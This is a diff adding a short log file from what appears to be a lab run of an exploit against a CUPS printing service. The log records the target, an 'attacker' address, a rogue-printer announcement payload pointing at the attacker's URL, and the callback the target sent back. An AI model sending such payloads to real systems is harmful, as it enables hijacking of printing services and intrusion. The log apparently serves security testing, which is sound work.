@@ -1,0 +1,5 @@
+2026-11-10 20:48:29,238 [INFO] Target: 172.18.0.2:631
+2026-11-10 20:48:29,239 [INFO] Attacker IP: 172.18.0.1, Port: 9100
+2026-11-10 20:48:29,239 [INFO] Payload: b'0 3 http://172.18.0.1:9100/printers/Printer\n'
+2026-11-10 20:48:29,799 [WARNING] [*] Callback from 172.18.0.2 - 414 bytes
+2026-11-10 20:48:29,814 [INFO] Sent packet 1/1
